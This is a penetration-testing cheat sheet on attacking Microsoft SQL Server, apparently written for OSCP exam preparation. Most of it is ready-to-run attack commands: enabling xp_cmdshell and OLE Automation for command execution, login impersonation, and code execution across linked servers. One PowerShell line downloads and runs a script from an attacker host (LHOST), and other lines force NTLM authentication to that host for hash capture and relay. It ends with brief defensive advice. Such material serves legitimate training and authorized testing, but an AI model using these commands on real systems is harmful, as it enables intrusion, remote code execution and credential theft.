# Attacking Microsoft SQL Server

MSSQL is a frequent OSCP foothold and lateral channel.

Prefer **Impacket / NetExec** over Metasploit modules for exam-friendly workflows.

## Discovery

```bash
# TCP 1433 + UDP browser/info
nmap -Pn -p 1433 TARGET
nmap -sU -p 1434 --script ms-sql-info TARGET
nxc mssql TARGET -u user -p pass
```

## Connection

```bash
impacket-mssqlclient domain/user:pass@TARGET -windows-auth
impacket-mssqlclient user:pass@TARGET
impacket-mssqlclient sa:pass@TARGET
impacket-mssqlclient -k -no-pass domain.local/user@sqlhost.domain.local
nxc mssql TARGET -u user -p pass -d DOMAIN
nxc mssql TARGET -u user -H NTHASH -d DOMAIN -x 'whoami'
```

## Situational awareness queries

```sql
SELECT SYSTEM_USER;          -- login
SELECT USER_NAME();          -- DB user
SELECT IS_SRVROLEMEMBER('public');
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT @@version;
SELECT name FROM sys.databases;
```

## Enable and use xp_cmdshell (sysadmin)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';
```

Classic exam pattern: drop/download reverse shell EXE to `C:\Windows\Tasks` and execute.

## Force NTLM auth (hash capture / relay)

```sql
EXEC master..xp_dirtree '\\LHOST\share';
EXEC master..xp_fileexist '\\LHOST\share\a';
```

Listener side:

```bash
sudo responder -I tun0
# or
impacket-ntlmrelayx -smb2support -t smb://OTHER -c 'whoami /all' -debug
```

## Impersonation

```sql
-- Logins you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- DB user impersonation
USE msdb;
EXECUTE AS USER = 'dbo';
```

## OLE Automation RCE alternative

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', null, 'whoami';
```

## Linked servers

```sql
EXEC sp_linkedservers;
-- or
SELECT * FROM sys.servers;
```

### Execute on linked server (RPC OUT)

```sql
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''whoami'';') AT SQL03;
```

### openquery

```sql
SELECT version FROM OPENQUERY("dc01", 'SELECT @@version AS version');
SELECT 1 FROM OPENQUERY("dc01", 'SELECT 1; EXEC sp_configure ''show advanced options'', 1; reconfigure');
SELECT 1 FROM OPENQUERY("dc01", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure');
SELECT * FROM OPENQUERY("sql03", 'EXEC master..xp_cmdshell ''whoami''');
```

### Double-link hop (crawl trust)

```sql
-- Identify who you are after following links
SELECT mylogin FROM OPENQUERY("dc01", 'SELECT SYSTEM_USER AS mylogin');
SELECT mylogin FROM OPENQUERY("dc01",
  'SELECT mylogin FROM OPENQUERY("appsrv01", ''SELECT SYSTEM_USER AS mylogin'')');

-- Nested EXEC AT
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01;
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01;
EXEC ('EXEC (''xp_cmdshell ''''whoami /priv'''';'') AT appsrv01') AT dc01;
```

## PowerUpSQL (Windows foothold)

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Invoke-SQLAudit -Verbose -Instance SQLServer1
Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1
Get-SQLServerLinkCrawl -Instance web06
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "EXEC master..xp_cmdshell 'whoami'"
Get-SQLQuery -Verbose -Instance "web06.dev.final.com" -Query "EXEC sp_serveroption 'SQL03', 'rpc out', 'true';"
```

## Typical privilege path

```text
Public web → DB creds in phpinfo/config
     → mssqlclient login
     → sysadmin or escalate via impersonation/links
     → xp_cmdshell as SQL service account
     → SeImpersonate → SYSTEM (PrintSpoofer)
     → dump creds / pivot
```

## Defensive recommendations (report language)

- Do not expose 1433 to unnecessary networks
- Never leave credentials in web-accessible files
- Least privilege for SQL service accounts
- Disable xp_cmdshell / Ole Automation unless required
- Audit linked server permissions and RPC OUT
- Monitor outbound SMB from SQL hosts
